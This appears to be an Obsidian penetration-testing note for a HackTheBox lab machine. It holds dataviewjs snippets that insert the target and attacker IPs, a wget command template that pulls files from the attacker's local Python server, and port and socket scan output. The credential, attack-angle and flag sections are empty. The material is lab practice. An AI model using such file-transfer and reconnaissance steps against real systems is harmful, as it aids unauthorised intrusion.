IP::   10.129.245.50

| Machine | IP Address | Notes |
| ------- | ---------- | ----- |
|         |            |       |

```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const ip = page?.IP ?? "NO IP FOUND";

const command = `${ip}`;

dv.paragraph("```bash\n" + command + "\n```");
```
KALI IP::  10.10.17.59
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `${KaliIP}`;

dv.paragraph("```bash\n" + command + "\n```");
```
Web Address
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const ip = page?.IP ?? "NO IP FOUND";

const command = `http://${ip}/`;

dv.paragraph("```bash\n" + command + "\n```");
```
Discovered Web Domain::   mcp.kobold.htb
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");
const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `http://${discoveredDomain}/`;

dv.paragraph("```bash\n" + command + "\n```");
```
[[Editing Page]]

wget from local python server
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `wget http://${KaliIP}:8000/[file]`;

dv.paragraph("```bash\n" + command + "\n```");
```
## Provided Credentials
---

```

```

```

```

---
## Software Versions







---



## Open Ports
---
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     nginx 1.24.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.24.0 (Ubuntu)

| Port | Service | Notes |
| ---- | ------- | ----- |
|      |         |       |

ss -tlpn
State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess                         
LISTEN 0      4096      127.0.0.54:53         0.0.0.0:*                                   
LISTEN 0      4096   127.0.0.53%lo:53         0.0.0.0:*                                   
LISTEN 0      4096       127.0.0.1:39247      0.0.0.0:*                                   
LISTEN 0      511        127.0.0.1:6274       0.0.0.0:*    users:(("node",pid=1642,fd=33))
LISTEN 0      511          0.0.0.0:80         0.0.0.0:*                                   
LISTEN 0      4096       127.0.0.1:8080       0.0.0.0:*                                   
LISTEN 0      4096         0.0.0.0:22         0.0.0.0:*                                   
LISTEN 0      511          0.0.0.0:443        0.0.0.0:*                                   
LISTEN 0      4096               *:3552             *:*                                   
LISTEN 0      4096            [::]:22            [::]:*

---

## Discovered Subdomains
---


---

## Discovered Credentials
---

| Username | Password | Notes |
| -------- | -------- | ----- |
|          |          |       |

---

## Attack Angles
---


---

## User Flag

```

```

## Root Flag

```

```